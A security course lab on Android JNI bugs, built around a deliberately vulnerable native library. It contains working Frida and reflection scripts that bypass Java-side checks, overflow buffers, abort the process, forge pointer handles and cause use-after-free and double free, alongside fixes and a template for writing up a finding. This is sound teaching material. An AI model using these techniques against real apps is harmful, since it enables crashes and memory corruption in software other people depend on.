# Lab 02 — References, exceptions, and the crash you can cause

**Difficulty:** Intermediate
**Time:** 2.5–4 hours
**Prerequisites:** [Lab 01](lab-01-building-the-bridge.md) ·
[Chapter 16 §3.13–§3.18](../README.md#313-references--local-global-weak-global) ·
[§5.1–§5.7](../README.md#51-the-thesis-stated-exactly) ·
[13 ART §3.23–§3.24](../../13-ART/README.md)

**What you need:**

| Requirement | Needed for | If you do not have it |
|---|---|---|
| Android NDK, a device or emulator, `adb` | Parts 2–6 | Part 1 is paper; read the rest |
| Root **or** a debuggable build | Part 3 (CheckJNI) | Repackage the test app with `android:debuggable="true"` |
| Frida | Parts 4–6 | The bypasses also work through plain reflection — see 4.4 |
| The examples built | everything | [`../examples/README.md`](../examples/README.md) |

---

## Objective

Turn the chapter's security thesis from a sentence you agree with into five defects you have
personally triggered:

> A bounds check written in Java protects nothing once the value crosses into C.

By the end you will be able to:

1. Reach a native method three different ways, none of which run the Java wrapper's validation.
2. Abort a target process with a single line of Java, and explain exactly why it is an `abort()`
   rather than an exception.
3. Use CheckJNI as a bug oracle and read its output as a finding.
4. Prove arbitrary-pointer control through a `jlong` handle, and produce the tombstone as evidence.
5. Write the remediation as code, and verify it.

---

## Setup

Build both libraries from [`../examples/`](../examples/README.md). You need **both**, with identical
symbol names, because swapping the library is how you verify a fix:

```bash
# host
$TC/aarch64-linux-android21-clang -shared -fPIC -O0 \
    -fno-stack-protector -U_FORTIFY_SOURCE \
    -o libunsafe.so ../examples/unsafe_jni.c

$TC/aarch64-linux-android21-clang -shared -fPIC -O2 \
    -fstack-protector-strong -D_FORTIFY_SOURCE=2 -Wl,-z,relro,-z,now \
    -o libfixed.so ../examples/fixed_jni.c

nm -D --defined-only libunsafe.so | grep ' T Java_'
nm -D --defined-only libfixed.so  | grep ' T Java_'
# the two lists must be IDENTICAL
```

Drop both into an app containing `../examples/UnsafeDemo.java`. `System.loadLibrary("unsafe")` picks
the vulnerable one; change the string to `"fixed"` to switch.

> **Warning.** `libunsafe.so` is deliberately exploitable. Use a throwaway app on a device or
> emulator you own. Never install it alongside anything you care about, and never leave it on a
> device you then use for anything else.

---

## Part 1 — Predict, on paper

Before running anything, answer these. Write your answers down; you will compare them to what
actually happens.

1. `decode(new byte[4096])` — what happens, and where?
2. `nativeDecode(new byte[4096], 4096)` by reflection — what happens, and where?
3. `nativeDecode(new byte[16], 4096)` by reflection — what happens? Is this different from 2?
4. `nativeLog` with 127 euro signs — how many bytes get written into the 128-byte buffer?
5. `nativeCount(new String[600])` — exception, or process death? Why?
6. `nativeRead(0x4141414141414141L, new byte[16])` — what is the observable effect?
7. Which of 1–6 would still work with `libfixed.so`?

<details>
<summary>Answers, for after you have run everything</summary>

1. `IllegalArgumentException` from the Java wrapper. Nothing native runs.
2. `memcpy` of 4096 bytes into a 256-byte stack buffer. Stack corruption; with `-O0
   -fno-stack-protector`, likely a crash on return with a wild PC.
3. **Different, and worse in one respect.** The source array is only 16 bytes, so the `memcpy` reads
   4080 bytes past the end of a *heap* allocation as well as writing past the end of a stack buffer.
   Two out-of-bounds accesses for the price of one.
4. 127 euro signs are 127 UTF-16 units but 381 modified-UTF-8 bytes. 381 into 128.
5. Process death. `local reference table overflow` is an `abort()`, not a Java exception.
6. `SIGSEGV` at `0x4141414141414141`, recorded in the tombstone. That address in the fault record is
   your evidence of controlled dereference.
7. Only 1. Every other one produces a clean Java exception against `libfixed.so`.

</details>

---

## Part 2 — Three ways past the Java check

### 2.1 The wrapper works

```bash
# adb shell — or via the app's UI
adb logcat -c
```

```java
// Java, inside the test app
new UnsafeDemo().decode(new byte[4096]);
```

Expect `IllegalArgumentException: input too large`. **The developer's check is real.** Do not skip
past this: half of understanding this bug class is appreciating that the developer *did* think about
bounds.

### 2.2 Bypass by reflection — no tooling at all

```java
// Java — inside the app itself, no Frida, no root
Method m = UnsafeDemo.class.getDeclaredMethod("nativeDecode", byte[].class, int.class);
m.setAccessible(true);
byte[] big = new byte[4096];
Arrays.fill(big, (byte) 0x41);
m.invoke(new UnsafeDemo(), big, 4096);
```

This is the point that matters most in a report: **package-private is not a security boundary.** It
is a compile-time visibility rule. Reflection ignores it, and so does any repackaged build.

### 2.3 Bypass with Frida

```javascript
// frida -U -f com.example.jnidemo -l bypass.js --no-pause
Java.perform(function () {
  const D = Java.use('com.example.jnidemo.UnsafeDemo');
  const inst = D.$new();
  const big = Java.array('byte', new Array(4096).fill(0x41));
  console.log('[*] calling nativeDecode directly');
  inst.nativeDecode(big, 4096);          // package-private: Java.use does not care
  console.log('[*] survived');
});
```

### 2.4 Bypass by repackaging

Delete the check from the smali and rebuild. Chapter
[10 APK Internals](../../10-APK-Internals/README.md) covers `apktool d`, editing, `apktool b`, and
re-signing. This is the bypass that matters when the attacker is distributing a modified app to other
users rather than attacking their own device.

```smali
# out/smali/com/example/jnidemo/UnsafeDemo.smali -- delete this branch
    array-length v0, p1
    const/16 v1, 0x100
    if-le v0, v1, :cond_0
    new-instance v0, Ljava/lang/IllegalArgumentException;
    ...
```

### 2.5 Collect the evidence

```bash
# host
adb logcat -c
# ... trigger ...
adb shell ls -l /data/tombstones/ | tail
adb shell cat /data/tombstones/tombstone_00 | head -40
```

Record: signal, fault address, `pc` value, and the module the `pc` falls in. The `backtrace` section
names the library and offset — which is what you take to Ghidra
([57](../../57-Ghidra/README.md)).

> **Success criterion.** You reached the native code by at least two different routes without the
> wrapper's check running, and you have a tombstone or an abort log to show for it.

---

## Part 3 — CheckJNI as a bug oracle

This is the highest yield-per-minute technique in the chapter.

### 3.1 Turn it on

```bash
# adb shell — needs root; applies to processes started afterwards
adb root
adb shell setprop dalvik.vm.checkjni true
adb shell am force-stop com.example.jnidemo
adb shell am start -n com.example.jnidemo/.MainActivity
```

No root? Make the app debuggable and CheckJNI turns on by itself:

```xml
<!-- AndroidManifest.xml -->
<application android:debuggable="true" ... >
```

Confirm it is active:

```bash
# host
adb logcat | grep -i 'checkjni\|Late-enabling'
```

### 3.2 Exercise every function and collect the aborts

Call each of `nativeDecode`, `nativeLog`, `nativeDeliver`, `nativeCount`, `nativeRead` in turn, with
hostile inputs. Capture logcat throughout:

```bash
# host
adb logcat -c
adb logcat > checkjni.log &
# ... exercise the app ...
grep -n 'JNI DETECTED ERROR\|JNI ERROR\|local reference table' checkjni.log
```

### 3.3 Read one abort properly

A CheckJNI abort has four parts, and all four are useful:

```text
JNI DETECTED ERROR IN APPLICATION: JNI CallVoidMethodV called with pending exception
  java.lang.IllegalStateException: boom
    at com.example.jnidemo.UnsafeDemo$ThrowingListener.onData(UnsafeDemo.java:...)
    at com.example.jnidemo.UnsafeDemo.nativeDeliver(Native Method)
  in call to CallVoidMethodV
  from void com.example.jnidemo.UnsafeDemo.nativeDeliver(...)
```

| Part | What it tells you |
|---|---|
| The rule broken | `called with pending exception` — this is [§5.3](../README.md#53-vulnerability-class-2--the-missing-exception-check) |
| The pending exception | what actually failed first |
| The Java stack | how a caller reaches it |
| `in call to` / `from` | the exact JNI function and the exact native method |

That is enough to write the finding without opening a disassembler.

### 3.4 Prove the oracle

Switch `System.loadLibrary("unsafe")` to `"fixed"`, rebuild, and repeat the whole of 3.2. **Every
abort should be gone**, replaced by clean Java exceptions.

> **Success criterion.** You have a table of CheckJNI aborts against `libunsafe.so` and an empty one
> against `libfixed.so`, produced by the same inputs.

---

## Part 4 — VULN 3: the missing exception check

### 4.1 Trigger it from Java

```java
// Java
new UnsafeDemo().nativeDeliver(new UnsafeDemo.ThrowingListener(), "payload");
```

The listener throws. JNI **does not unwind**: `CallVoidMethod` returns to C normally, with an
exception pending on the thread, and the C code carries on.

### 4.2 Trigger it from Frida, without changing the app

```javascript
// frida -U -f com.example.jnidemo -l throwing.js --no-pause
Java.perform(function () {
  // Make an existing listener throw, without editing the app.
  const L = Java.use('com.example.jnidemo.UnsafeDemo$Listener');
  // (For a concrete class, replace with the implementing class name.)
  const Impl = Java.use('com.example.jnidemo.SomeRealListener');
  Impl.onData.implementation = function (s) {
    throw Java.use('java.lang.IllegalStateException').$new('injected');
  };
});
```

**This is a general technique worth remembering.** Any Java callback the native code invokes is a
place you can inject a failure. It costs nothing and it reaches error paths that ordinary testing
never touches.

### 4.3 Trigger the *other* branch

Make `GetMethodID` fail instead. Hook the listener's class so its `onData` signature no longer
matches — or pass an object that does not implement it:

```javascript
// frida
Java.perform(function () {
  const D = Java.use('com.example.jnidemo.UnsafeDemo');
  const wrong = Java.use('java.lang.Object').$new();
  D.$new().nativeDeliver(Java.cast(wrong, Java.use('com.example.jnidemo.UnsafeDemo$Listener')),
                         'payload');
});
```

Now `GetMethodID` returns `NULL` and `NoSuchMethodError` is pending, and the code calls through a
NULL `jmethodID`.

### 4.4 Read the fix

Open `../examples/fixed_jni.c` at `FIX 3` and note the shape: a branch after **every** fallible call.

**Write down the review heuristic:** correct JNI code is visually branch-heavy. A run of JNI calls
with no branch between them is suspicious by shape alone, before you read a single argument. Use that
when you are skimming a decompilation with thirty functions in it.

---

## Part 5 — VULN 5: aborting the process on demand

### 5.1 Trigger

```javascript
// frida -U -f com.example.jnidemo -l dos.js --no-pause
Java.perform(function () {
  const D = Java.use('com.example.jnidemo.UnsafeDemo');
  const arr = Java.array('java.lang.String', new Array(600).fill('x'));
  D.$new().nativeCount(arr);
});
```

```bash
# host
adb logcat | grep -i 'local reference table'
```

```text
JNI ERROR (app bug): local reference table overflow (max=512)
```

The process is gone. Confirm:

```bash
# host
adb shell ps -A | grep jnidemo    # nothing
```

### 5.2 Find the exact threshold

Binary search the array size. You should find the boundary a little under 512 — the arguments to the
native method and any references the runtime already held occupy slots too. **Record the number you
measured**, not the number the chapter states; the point is that the cap is real and observable.

### 5.3 Why it is an abort and not an exception

Answer these in writing:

- Can Java code `catch` this? (Try it. Wrap the call in `try { } catch (Throwable t) { }`.)
- Does an `UncaughtExceptionHandler` fire?
- What does that imply for an app whose availability matters?

### 5.4 Make it a real finding

The defect is only interesting if the count crosses a trust boundary. For each of these, say whether
it does:

| Source of the array | Trust boundary crossed? |
|---|---|
| A literal in the app's own code | No |
| An `Intent` extra from an exported `Activity` | **Yes** — any app on the device |
| A JSON array in an HTTPS response | **Yes** — a network attacker, or a compromised backend |
| A parsed file the user selected | Yes, with user interaction |
| A `ContentProvider` query result the app makes | Depends on the provider |

Write the finding for the second row: title, affected function, reachable path, repro, impact,
remediation, severity. Then check your severity reasoning against
[§5.4](../README.md#54-vulnerability-class-3--local-reference-exhaustion).

### 5.5 Both fixes

Patch `unsafe_jni.c` two ways and confirm each stops the abort:

```c
/* fix A -- one line */
(*env)->DeleteLocalRef(env, s);

/* fix B -- a frame per iteration */
if ((*env)->PushLocalFrame(env, 16) != JNI_OK) return -1;
/* ... body ... */
(*env)->PopLocalFrame(env, NULL);
```

Then try `EnsureLocalCapacity(env, n)` and observe what happens with a genuinely huge `n` — it
throws `OutOfMemoryError` rather than aborting, which is a *different* and better failure mode, but
still not a fix if the loop keeps every reference alive for no reason.

---

## Part 6 — VULN 4: arbitrary pointer through a `jlong`

### 6.1 Observe the normal path

```javascript
// frida
Java.perform(function () {
  const D = Java.use('com.example.jnidemo.UnsafeDemo');
  const d = D.$new();
  d.open();
  const out = Java.array('byte', new Array(16).fill(0));
  console.log('read = ' + d.read(out));
});
```

### 6.2 Forge the handle

```javascript
// frida
Java.perform(function () {
  const D = Java.use('com.example.jnidemo.UnsafeDemo');
  // nativeRead is private static; Java.use exposes it.
  D.nativeRead(0x4141414141414141, Java.array('byte', new Array(16).fill(0)));
});
```

```bash
# host
adb shell ls -lt /data/tombstones/ | head -3
adb shell cat /data/tombstones/tombstone_XX | sed -n '1,30p'
```

**The fault address in the tombstone is `0x4141414141414141`.** That is not a coincidence and it is
not ambiguous: it is proof that Java code chose the address the native code dereferenced. Screenshot
it; that single line is the strongest evidence in the whole lab.

### 6.3 Use after free, and double free

```javascript
// frida — UAF
Java.perform(function () {
  const d = Java.use('com.example.jnidemo.UnsafeDemo').$new();
  d.open();
  const h = d.nativeHandle.value;      // read the private field
  d.close();                            // frees it
  Java.use('com.example.jnidemo.UnsafeDemo').nativeRead(h, Java.array('byte', [0]));
});
```

```javascript
// frida — double free, from two threads
Java.perform(function () {
  const d = Java.use('com.example.jnidemo.UnsafeDemo').$new();
  d.open();
  const h = d.nativeHandle.value;
  Java.use('com.example.jnidemo.UnsafeDemo').nativeClose(h);
  Java.use('com.example.jnidemo.UnsafeDemo').nativeClose(h);
});
```

Expect a `malloc` abort or heap corruption. Both are memory-safety findings.

### 6.4 Read and evaluate the fix

`fixed_jni.c` uses a magic word plus a registry. `enterprise_bridge.cpp` goes further and never
exposes an address at all: the token is `(generation << 32) | slot`, and a forged value fails an
integer comparison.

Answer, in writing:

1. Which of the two defeats forgery? Which defeats use-after-free? Which defeats both?
2. Why is `AtomicLong.getAndSet(0)` on the Java side *also* necessary?
3. What does `NativeAllocationRegistry` change about the whole question?

---

## Part 7 — VULN 2: string length confusion

```javascript
// frida
Java.perform(function () {
  const D = Java.use('com.example.jnidemo.UnsafeDemo');
  let s = '';
  for (let i = 0; i < 127; i++) s += '€';   // EURO SIGN
  D.nativeLog(s);
});
```

Then answer:

- `GetStringLength` for this string returns what?
- `GetStringUTFLength` returns what?
- Which one did the vulnerable code compare against `sizeof(buf)`?
- What is the worst multiplier — that is, which characters give the largest byte-per-unit ratio?

<details>
<summary>Answers</summary>

127 and 381 respectively. The vulnerable code used the first. The worst ratio is 3 bytes per UTF-16
unit for a BMP character outside the ASCII and 2-byte ranges — and an astral character occupies two
UTF-16 units encoded as **two** three-byte surrogate sequences in modified UTF-8, so six bytes for
two units, which is the same 3:1 ratio. Plus U+0000, which is two bytes for one unit.

</details>

---

## Hints

<details>
<summary>Hint 1 — nothing crashes; everything just works</summary>

Your build is hardened. `-fstack-protector-strong` turns the overflow into a clean abort, and
`_FORTIFY_SOURCE` may turn the `memcpy` into a checked one. That is realistic and it is a *finding*
about severity, not a failure of the lab. Rebuild with `-O0 -fno-stack-protector
-U_FORTIFY_SOURCE` if you want to see raw corruption, and say in your report which build you tested.

</details>

<details>
<summary>Hint 2 — Java.use cannot see the package-private method</summary>

It can. If it genuinely cannot, you have the wrong class name — check with
`Java.enumerateLoadedClassesSync().filter(n => n.includes('jnidemo'))`. For an overloaded method use
`.overload('[B', 'int')`.

</details>

<details>
<summary>Hint 3 — CheckJNI is not producing anything</summary>

It applies to processes started *after* the `setprop`. Force-stop and restart. Confirm with a
deliberate violation you know it catches, such as `nativeCount(new String[600])`.

</details>

<details>
<summary>Hint 4 — no tombstone appears</summary>

Tombstones need root to read. `adb logcat` also captures the crash header with the fault address
(`Fatal signal 11 (SIGSEGV), code 1, fault addr 0x4141414141414141`), which is enough evidence on
its own.

</details>

<details>
<summary>Hint 5 — I cannot read the private nativeHandle field</summary>

`Java.use(...).$new()` gives you an instance wrapper; fields are accessed as `.fieldName.value`. If
the name is obfuscated, enumerate with `Java.use(cls).class.getDeclaredFields()`.

</details>

---

## Success criteria

| # | Criterion |
|---|---|
| 1 | You reached a native method by reflection, by Frida, and (optionally) by repackaging |
| 2 | You produced a tombstone or crash log for the buffer overflow |
| 3 | You aborted the process with a local reference overflow and measured the actual threshold |
| 4 | You explained why that abort is not catchable, with evidence |
| 5 | You proved arbitrary-pointer control and captured the fault address |
| 6 | You collected a table of CheckJNI aborts, and showed it is empty against the fixed library |
| 7 | You wrote one finding end to end: repro, impact, remediation as code, honest severity |
| 8 | You can state the review heuristic for missing exception checks in one sentence |

---

## Deliverable

Write up **one** of the five defects as a real finding. Use this skeleton:

```text
TITLE
  Out-of-bounds write in Java_com_example_jnidemo_UnsafeDemo_nativeDecode

AFFECTED
  libunsafe.so (arm64-v8a), offset 0x____, reached via
  com.example.jnidemo.UnsafeDemo.nativeDecode(byte[], int)

SUMMARY
  The native implementation copies `length` bytes into a 256-byte stack
  buffer without consulting the array's own length. The only bound is a
  check in the Java wrapper decode(byte[]), which is not on the path when
  the native method is invoked directly.

REACHABILITY
  nativeDecode is package-private, not private, and is reachable by
  reflection from within the app's process and by any instrumentation
  framework. [State whether it is reachable across a trust boundary; if it
  is not, say so and set severity accordingly.]

REPRODUCTION
  [the exact reflection snippet]

OBSERVED
  SIGSEGV / stack-protector abort, tombstone at ____, pc in libunsafe.so+____

IMPACT
  [what an attacker gains, given who can reach it]

REMEDIATION
  Derive the length from the object and bound the destination:
  [the fixed_jni.c FIX 1 snippet]

SEVERITY
  [with the reasoning, not just the label]
```

---

## Next

[Lab 03 — Recovering dynamically registered natives](lab-03-recovering-dynamic-natives.md)
